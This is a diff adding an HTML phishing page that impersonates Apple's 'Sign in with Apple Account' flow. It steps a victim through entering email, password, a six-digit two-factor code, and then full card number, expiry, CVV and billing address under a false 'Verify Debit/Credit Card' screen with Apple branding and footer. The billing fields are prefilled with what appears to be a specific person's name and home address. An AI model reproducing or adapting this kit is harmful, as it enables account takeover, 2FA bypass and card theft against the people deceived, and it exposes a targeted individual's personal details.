@@ -1,0 +1,234 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sign in with Apple Account</title>
+    <link rel="stylesheet" href="public/styles.css">
+</head>
+<body>
+    <div class="container">
+        <!-- Step 1: Username -->
+        <div id="step1" class="step active">
+            <div class="logo-container">
+                <img src="https://i.ibb.co/7tsFgcbZ/IMG-2097.png" alt="Apple Logo" class="logo">
+            </div>
+            <h1>Sign in with Apple Account</h1>
+            <div class="input-group">
+                <label for="username">Email or Phone Number</label>
+                <input type="text" id="username" value="example@icloud.com">
+            </div>
+            <div class="checkbox-group">
+                <input type="checkbox" id="keep-signed-in">
+                <label for="keep-signed-in">Keep me signed in</label>
+            </div>
+            <button id="username-next" class="btn">Next</button>
+            <div class="links">
+                <a href="#" id="forgot-password">Forgot password?</a>
+                <a href="#" id="create-account">Create Apple Account</a>
+            </div>
+        </div>
+
+        <!-- Step 2: Password -->
+        <div id="step2" class="step">
+            <div class="logo-container">
+                <img src="https://i.ibb.co/7tsFgcbZ/IMG-2097.png" alt="Apple Logo" class="logo">
+            </div>
+            <h1>Sign in with Apple Account</h1>
+            <div class="input-group">
+                <label for="username-disabled">Email or Phone Number</label>
+                <input type="text" id="username-disabled" value="example@icloud.com" readonly>
+            </div>
+            <div class="input-group">
+                <label for="password">Password</label>
+                <input type="password" id="password">
+            </div>
+            <div id="password-error" class="error-message" style="display: none;">
+                Check the account information you entered and try again.
+            </div>
+            <div class="checkbox-group">
+                <input type="checkbox" id="remember-me">
+                <label for="remember-me">Remember me</label>
+            </div>
+            <button id="sign-in" class="btn">Sign In</button>
+            <div class="links">
+                <a href="#" id="forgot-password2">Forgot password?</a>
+            </div>
+        </div>
+
+        <!-- Step 3: 2FA Verification -->
+        <div id="step3" class="step">
+            <div class="logo-container">
+                <img src="https://i.ibb.co/7tsFgcbZ/IMG-2097.png" alt="Apple Logo" class="logo">
+            </div>
+            <h1>Two-Factor Authentication</h1>
+            <p class="note" style="text-align: center; margin-bottom: 20px;">
+                Enter the verification code sent to your phone.
+            </p>
+            <div class="verification-container">
+                <input type="tel" class="verification-input" maxlength="1" data-index="1">
+                <input type="tel" class="verification-input" maxlength="1" data-index="2">
+                <input type="tel" class="verification-input" maxlength="1" data-index="3">
+                <input type="tel" class="verification-input" maxlength="1" data-index="4">
+                <input type="tel" class="verification-input" maxlength="1" data-index="5">
+                <input type="tel" class="verification-input" maxlength="1" data-index="6">
+            </div>
+            <div id="verification-error" class="error-message" style="display: none;">
+                Incorrect verification code. Please try again.
+            </div>
+            <button id="verify-code" class="btn" disabled>Verify</button>
+            <div class="links" style="justify-content: space-between;">
+                <a href="#" id="resend-code">Resend code</a>
+                <a href="#" id="cant-use-number">Can't use this number?</a>
+            </div>
+            <div class="note" style="margin-top: 20px;">
+                If you can't enter a code because you've lost your device, you can use Find Devices to locate it or Manage Devices to remove your Apple Pay cards from it.
+            </div>
+        </div>
+
+        <!-- Step 4: Billing Information -->
+        <div id="step4" class="step">
+            <div class="logo-container">
+                <img src="https://i.ibb.co/7tsFgcbZ/IMG-2097.png" alt="Apple Logo" class="logo">
+            </div>
+            <h2>Verify Debit/Credit Card</h2>
+            <div class="card-logos-combined" style="display: flex; align-items: center; justify-content: center; gap: 12px; flex-wrap: wrap; margin: 20px 0;">
+                <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSl2VtlcLwP_GWmjiYqVQoJ7OG4rambjKSzGg&usqp=CAU" alt="All Cards" style="height: 40px;">
+                <div class="card-logo">Apple Card</div>
+                <div class="card-logo">Visa</div>
+                <div class="card-logo">Mastercard</div>
+                <div class="card-logo">AMEX</div>
+                <div class="card-logo">Discover</div>
+                <div class="card-logo">UnionPay</div>
+            </div>
+
+            <div class="section-title">Enter your card information:</div>
+
+            <div class="input-group">
+                <label for="card-number">Credit/Debit Card Number</label>
+                <input type="tel" id="card-number" maxlength="16" placeholder="0000 0000 0000 0000">
+            </div>
+
+            <div class="split-row">
+                <div class="input-group">
+                    <label for="expiry">Expiration MM/YY</label>
+                    <input type="tel" id="expiry" maxlength="5" placeholder="MM/YY">
+                </div>
+                <div class="input-group">
+                    <label for="cvv">CVV</label>
+                    <input type="tel" id="cvv" maxlength="4" placeholder="123">
+                </div>
+            </div>
+
+            <div class="checkbox-group">
+                <input type="checkbox" id="apple-card">
+                <label for="apple-card">Paying with Apple Card? Learn how to find your Apple Card number</label>
+            </div>
+
+            <div class="section-title" style="margin-top: 30px;">Split payment with a second card</div>
+            <p class="note">To split your payment, both cards must share the same billing address.</p>
+
+            <div class="section-title" style="margin-top: 30px;">Billing Address</div>
+
+            <div class="input-group">
+                <label for="country">Country/Region</label>
+                <select id="country">
+                    <option>United States</option>
+                    <option>Canada</option>
+                    <option>United Kingdom</option>
+                    <option>Australia</option>
+                </select>
+            </div>
+
+            <div class="split-row">
+                <div class="input-group">
+                    <label for="first-name">First Name</label>
+                    <input type="text" id="first-name" value="LACAVA">
+                </div>
+                <div class="input-group">
+                    <label for="last-name">Last Name</label>
+                    <input type="text" id="last-name" value="CATHERINE">
+                </div>
+            </div>
+
+            <div class="input-group">
+                <label for="street">Street Address</label>
+                <input type="text" id="street" value="34308 Manor Run Cir">
+            </div>
+
+            <div class="input-group">
+                <label for="apt">Apt, Suite, Bldg. (Optional)</label>
+                <input type="text" id="apt">
+            </div>
+
+            <div class="split-row">
+                <div class="input-group">
+                    <label for="zip">Zip Code</label>
+                    <input type="text" id="zip" value="48312-5330">
+                </div>
+                <div class="input-group">
+                    <label for="city">City</label>
+                    <input type="text" id="city" value="Sterling Heights">
+                </div>
+            </div>
+
+            <div class="input-group">
+                <label for="state">State</label>
+                <input type="text" id="state" value="MI">
+            </div>
+
+            <div class="section-title" style="margin-top: 30px;">Contact Information</div>
+
+            <div class="input-group">
+                <label for="email">Email Address</label>
+                <input type="email" id="email" value="f......t@icloud.com" readonly>
+            </div>
+
+            <div class="input-group">
+                <label for="phone">Phone Number</label>
+                <input type="tel" id="phone" value="(....) ....2341" readonly>
+            </div>
+
+            <p class="note">The phone number you enter can't be changed after you place your order, so please make sure it's correct.</p>
+
+            <div class="divider"></div>
+
+            <div class="checkbox-group">
+                <input type="checkbox" id="apply-card">
+                <label for="apply-card">Apply for Apple Card in as little as a minute and get 3% Daily Cash back on this purchase.</label>
+            </div>
+
+            <ul class="note" style="margin-left: 20px; margin-top: 10px;">
+                <li>No annual, foreign, or late fees. No fees, period.</li>
+                <li>Get Daily Cash back on everything you buy from Apple.</li>
+                <li>Apply now to see if you're approved with no impact to your credit score.</li>
+            </ul>
+
+            <button id="submit-payment" class="btn">Pay Setup Required</button>
+        </div>
+
+        <!-- Loading Screen -->
+        <div id="loading" class="step">
+            <div class="loading">
+                <div class="spinner"></div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Apple Inc Footer -->
+    <footer class="apple-footer">
+        <div class="footer-content">
+            <img src="https://s.mzstatic.com/email/images_shared/logo_apple_d-2x.png" alt="Apple Inc" class="footer-logo">
+            <p>© 2024 Apple Inc. All rights reserved.</p>
+            <div class="footer-links">
+                <a href="#">Privacy Policy</a>
+                <a href="#">Terms of Use</a>
+                <a href="#">Support</a>
+                <a href="#">Contact Us</a>
+            </div>
+        </div>
+    </footer>
+
+    <script src="public/script.js"></script>
+</body>
+</html>
